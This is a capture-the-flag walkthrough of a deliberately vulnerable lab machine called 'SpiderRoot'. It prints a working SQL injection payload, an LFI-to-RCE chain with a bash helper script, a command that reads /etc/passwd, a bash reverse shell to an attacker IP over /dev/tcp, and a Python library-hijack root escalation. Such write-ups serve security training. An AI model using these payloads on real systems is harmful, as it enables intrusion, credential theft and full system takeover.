![Screenshot](/medium/SpiderRoot/Images/machine.png)

Difficulty: **medium**

Made by: **Grooti**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

Fist we make sure that the machine is really up, we can do this with the command **ping.**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/SpiderRoot]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.227 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.126 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.089 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2047ms
rtt min/avg/max/mdev = 0.089/0.147/0.227/0.058 ms
```

Okay so we can start out **reconnaissance** phase.

---
# Reconnaissance

We start our reconnaissance phase with **nmap** to scan what ports are open in the target.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:43 -05
Initiating ARP Ping Scan at 21:43
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:43, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:43
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:43, 3.09s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000027s latency).
Scanned at 2025-12-08 21:43:42 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.47 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see that are 2 ports open:

- port 22 (ssh / secure shell)
- port 80 (http / Hyper-Text transfer protocol)

So we can do another nmap scan to know more about these 2 ports to see what services are using or technologies.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ open target.html 
```

And we can see this in our browser:

![Screenshot](/medium/SpiderRoot/Images/image1.png)

So we see that the port 80 is a website, let's take a look in our browser.

![Screenshot](/medium/SpiderRoot/Images/image2.png)

We can see this website, let's explore it more in detail.

![Screenshot](/medium/SpiderRoot/Images/image3.png)

So we can see this, let's take a look in the source code.

```
<!-- Hint oculto: Algunas vulnerabilidades pueden estar camufladas en caracteres codificados o comentarios. -->
<!-- Hint oculto: Prueba usar OR, AND o comentarios de manera codificada para evadir el WAF. -->
```

We can see this comments that give us a little of help, the message basically give us that we need to use OR, AND, also comments and be in url encoded, so in summary we need to exploit a **SQLI**

---
# Exploitation

Let's use the next payload:

```
' or 1=1-- -
```

In url encoded format looks something like this:

```
%27%20or%201%3D1%2D%2D%20%2D
```

And we can see this in our browser:

![Screenshot](/medium/SpiderRoot/Images/image4.png)

We got credentials from the users, let's try to login with ssh.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ ssh peter@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:qegAsV1ET03xF9HPURhA8erWxtbRCmYAQ3SOek79ur0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
peter@172.17.0.2's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Sep  4 00:01:02 2025 from 172.17.0.1
peter@05b3003684a1:~$
```

The one that works is with the user **peter**

---
# Privilege Escalation

After a long enumeration to try to escalate our privileges, We can see that the **opt** directory we can see this file:

```
peter@05b3003684a1:/opt$ ls -la
total 12
drwxrwxr-x 1 root spiderlab 4096 Sep  4 00:17 .
drwxr-xr-x 1 root root      4096 Dec  9 03:36 ..
-rwxr--r-- 1 root root       808 Sep  4 00:17 spidy.py
```

Only the user root can modify this file, but we can read his content! let's see what's inside of this python file.

```python
#!/usr/bin/env python3
# spidey_run.py - Spider-Man Python Lab

import os
import sys
import json
import math
def web_swing():
    print("🕷️ Spider-Man se balancea por la ciudad.")
    print("Explorando los tejados y vigilando la ciudad...")

def run_tasks():
    print("🕸️ Ejecutando tareas del día...")
    print("Saltos calculados:", math.sqrt(225))
    data = {"hero": "Spider-Man", "city": "New York"}
    print("Registro de datos:", json.dumps(data))

def fight_villains():
    villains = ["Green Goblin", "Doctor Octopus", "Venom"]
    print("Villanos en la ciudad:", ", ".join(villains))
    for v in villains:
        print(f"🕷️ Enfrentando a {v}...")

if __name__ == "__main__":
    web_swing()
    run_tasks()
    fight_villains()
    print("✅ Spider-Man ha terminado su ronda.")
```

We can see that the program imports some libraries, we can try to do **python library hijacking** but it doesn't work, I can't execute it and doesn't exist a process that execute this python script by a determined time.

But it exists something interesting on the **/var/www** directory that contains the website and something else too.

```
peter@05b3003684a1:/var/www$ ls
html  internal
```

We can see another directory. Let's see what have inside.

```
peter@05b3003684a1:/var/www/internal$ ls
index.php
```

We see a php script. Let's take a look.

```php
peter@05b3003684a1:/var/www/internal$ tail -n 30 index.php 
            max-width: 90%;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <header>Panel Interno del Multiverse</header>
    <main>
        <p>Introduce un comando para ejecutar en el sistema:</p>
        <form method="GET">
            <input type="text" name="cmd" placeholder="Escribe un comando...">
            <input type="submit" value="Ejecutar">
        </form>
        <div class="output">
            <?php
            if (isset($_GET['cmd'])) {
                $cmd = $_GET['cmd'];
                echo "<strong>Salida de:</strong> $cmd\n\n";
                echo "<pre>";
                system($cmd);
                echo "</pre>";
            } else {
                echo "Aquí aparecerá la salida del comando.";
            }
            ?>
        </div>
    </main>
</body>
</html>
```

We can see another website, this can execute execute commands in the system as the user **www-data** with the parameter **cmd** but we need to see this website, and be able to execute commands on it.

But in the main website we can see this:

```php
peter@05b3003684a1:/var/www/html$ tail -n 30 index.php 
        }
    </style>
</head>
<body>
    <header>
        🕸️ Spider-Verse Nexus 2099 🕷️
    </header>
    <nav>
        <a href="?page=heroes">Héroes</a>
        <a href="?page=multiverse">Multiverso</a>
        <a href="?page=contact">Contacto</a>
    </nav>
    <section>
        <?php
            if (isset($_GET['page'])) {
                $page = $_GET['page'];
                include("pages/" . $page . ".php"); // 🚨 Vulnerabilidad LFI
            } else {
                echo "<h2>🌌 Bienvenido al Spider-Verse 2099</h2>
                <p>Conéctate al nexo del multiverso y descubre secretos ocultos de cada realidad.</p>
                <p><i>“Un gran poder conlleva una gran responsabilidad”</i></p>";
            }
        ?>
    </section>
    <footer>
        © 2099 Spider-Verse | Grooti16 Cybernetics 🧪
    </footer>
</body>
</html>
```

In this part of the website we can try to load any php file on the system, basically a **Local File Inclusion**, so we can try to load the another page to execute commands on the system LFI -> RCE

So we need to modify the page argument to load the another page.

![Screenshot](/medium/SpiderRoot/Images/image5.png)

We can see this, but when we try to execute the command we can't do it quite well, but with the curl command we can do this:

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ curl -s 'http://172.17.0.2/?page=../../internal/index&cmd=id' | html2text
k
🕸️ Spider-Verse Nexus 2099 🕷️ Héroes Multiverso Contacto
Panel Interno del Multiverse
Introduce un comando para ejecutar en el sistema:
[cmd                 ][Ejecutar]
Salida de: id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(spiderlab)
© 2099 Spider-Verse | Grooti16 Cybernetics 🧪
```

Now we can execute commands as the user **www-data**.

Im going to make a bash script to be able to execute commands more easily.

```bash
#!/bin/bash

function ctrl_c {
        echo "[!] Quitting..."
        exit 1
}

trap ctrl_c INT

while true; do
        read -p "[*] Command -> " cmd

        if [[ "$cmd" == "clear" ]]; then
                clear
                continue
        fi

        encoded=$(printf %s "$cmd" | jq -sRr @uri)

        curl -s "http://172.17.0.2/?page=../../internal/index&cmd=$encoded" | html2text | grep -A 100 "Salida"
done
```

In this bash script we can execute commands more easily and fast, and encoding the command that we are going to execute and make a request to the server exploiting this LFI to RCE

```
[*] Command -> id
Salida de: id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(spiderlab)
© 2099 Spider-Verse | Grooti16 Cybernetics 🧪
```

Great let's see if we can see /etc/passwd.

```
[*] Command -> cat /etc/passwd 
Salida de: cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
peter:x:1001:1001:peter,,,:/home/peter:/bin/bash
© 2099 Spider-Verse | Grooti16 Cybernetics 🧪
```

Okay so now we can try to make a reverse shell to gain access into the system as the user **www-data**

But first Im going to listen with **netcat** to a port waiting to receive traffic into me as the attack machine.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Okay now we are listening to this port. So now let's execute our command to make the reverse shell.

```
[*] Command -> bash -c 'bash -i >& /dev/tcp/192.168.0.20/1234 0>&1'
```

Once we execute this command we are going to receive a interactive bash shell to our attack machine.

And we can see this in the netcat window:

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 38426
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
www-data@05b3003684a1:/var/www/html$ whoami
whoami
www-data
```

We can make some treatment of the tty to make this reverse shell more comfortable to work with.

First of all we do this:

```
www-data@05b3003684a1:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/exploits]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
www-data@05b3003684a1:/$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```
stty rows {num} columns {num}
```

and finally it looks way better!

And when we execute **sudo -l** we got this:

```
www-data@05b3003684a1:/$ sudo -l
Matching Defaults entries for www-data on 05b3003684a1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 05b3003684a1:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
```

Now we can execute the **python script**!

So we can do a python library hijacking, why we can escalate our privileges with this?

Because always python searches first the libraries (scripts also made with python) that exist on the working directory before searching the really trusty libraries, so we can execute our commands as the user root, because the python script the owner is the user **root**!

So we create another python script of any library that's being imported from the **spidy.py** script

The next libraries are being imported from the **spidy.py** script:

- **os**
- **sys**
- **json**
- **math**

So in my case im going to use **json**, to escalate privileges.

```python
import os

os.system("bash")
```

So in that script we are going to get a shell as the user **root**

```
www-data@2a6226f68688:/opt$ ls
json.py  spidy.py
```

remember that the script needs to be in the same directory that we are going to execute our payload!

Okay so now let's execute the spidy script now.

```
www-data@2a6226f68688:/opt$ sudo python3 /opt/spidy.py 
root@2a6226f68688:/opt# whoami
root
```

Now we are root and can see the flag!

```
root@2a6226f68688:/opt# cat ~/flag.txt 
⠀⠀⠀⠀⠀⠀⠀⢀⠆⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡀⠀⠰⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡏⠀⢀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⢹⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⡟⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⢻⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⠁⠀⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠈⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣾⡇⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⢸⣿⠀⠀⠀⠀
⠀⠀⠀⢸⣿⠀⠀⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣇⠀⠀⣿⡇⠀⠀⠀
⠀⠀⠀⣿⣿⠀⠀⣿⣿⣧⣤⣤⣤⣤⣤⣤⡀⠀⣀⠀⠀⣀⠀⢀⣤⣤⣤⣤⣤⣤⣼⣿⣿⠀⠀⣿⣿⠀⠀⠀
⠀⠀⢸⣿⡏⠀⠀⠀⠙⢉⣉⣩⣴⣶⣤⣙⣿⣶⣯⣦⣴⣼⣷⣿⣋⣤⣶⣦⣍⣉⡉⠋⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠀⢿⣿⣷⣤⣶⣶⠿⠿⠛⠋⣉⡉⠙⢛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⢉⣉⠙⠛⠿⠿⣶⣶⣤⣾⣿⡿⠀⠀
⠀⠀⠀⠙⠻⠋⠉⠀⠀⠀⣠⣾⡿⠟⠛⣻⣿⣿⣿⣿⣿⣿⣿⣿⣟⠛⠻⢿⣷⣄⠀⠀⠀⠉⠙⠟⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠿⠋⢀⣠⣾⠟⢫⣿⣿⣿⣿⣿⣿⡍⠻⣷⣄⡀⠙⠿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⡿⠛⠁⠀⢸⣿⣿⠋⠀⢸⣿⣿⣿⣿⣿⣿⡗⠀⠙⣿⣿⡇⠀⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀
⢀⠀⣀⣴⣾⠟⠋⠀⠀⠀⠀⢸⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠙⠻⣷⣦⣀⠀⣀
⢸⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⡟
⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⢹⣿⣿⣿⣿⡏⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇
⢸⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⢿⣿⣿⡿⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡇
⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠈⠿⠿⠁⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠀
⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀
⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣾⠏⠀⠀
⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀
⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⠀⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀



Grooti16
```

***...pwned..!***
